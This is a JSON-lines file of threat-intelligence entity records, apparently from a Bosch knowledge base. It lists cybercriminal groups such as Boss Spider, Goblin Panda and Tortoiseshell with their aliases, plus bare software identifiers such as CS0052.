{"text": " GOLD LOWELL was a financially motivated cybercriminal threat group that targeted victims with organization-wide attacks using the Samas (also known as SamSam) ransomware.", "idx": "http://www.bosch.com/group/boss-spider", "title": "Boss Spider", "entity": "Boss Spider", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0052 CS0052", "idx": "http://www.bosch.com/software/CS0052", "title": "CS0052", "entity": "CS0052", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Goblin Panda Hellsing Goblin Panda Cycldek 1937CN Conimes", "idx": "http://www.bosch.com/group/goblin-panda", "title": "Goblin Panda", "entity": "Goblin Panda", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0057 CS0057", "idx": "http://www.bosch.com/software/CS0057", "title": "CS0057", "entity": "CS0057", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0054 CS0054", "idx": "http://www.bosch.com/software/CS0054", "title": "CS0054", "entity": "CS0054", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " wmiexec.py CS0010 CS0010", "idx": "http://www.bosch.com/software/CS0010", "title": "CS0010", "entity": "CS0010", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0022 CS0022", "idx": "http://www.bosch.com/software/CS0022", "title": "CS0022", "entity": "CS0022", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0001 CS0001", "idx": "http://www.bosch.com/software/CS0001", "title": "CS0001", "entity": "CS0001", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Vicious Panda vicious-panda Microcin Vicious Panda SixLittleMonkeys", "idx": "http://www.bosch.com/group/vicious-panda", "title": "vicious-panda", "entity": "vicious-panda", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0032 CS0032", "idx": "http://www.bosch.com/software/CS0032", "title": "CS0032", "entity": "CS0032", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0016 CS0016", "idx": "http://www.bosch.com/software/CS0016", "title": "CS0016", "entity": "CS0016", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0002 CS0002", "idx": "http://www.bosch.com/software/CS0002", "title": "CS0002", "entity": "CS0002", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Imperial Kitten Tortoiseshell Tortoiseshell", "idx": "http://www.bosch.com/group/tortoiseshell", "title": "Tortoiseshell", "entity": "Tortoiseshell", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " DD4BC Pizzo Spider Pizzo Spider", "idx": "http://www.bosch.com/group/pizzo-spider", "title": "Pizzo Spider", "entity": "Pizzo Spider", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0044 CS0044", "idx": "http://www.bosch.com/software/CS0044", "title": "CS0044", "entity": "CS0044", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0078 CS0078", "idx": "http://www.bosch.com/software/CS0078", "title": "CS0078", "entity": "CS0078", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
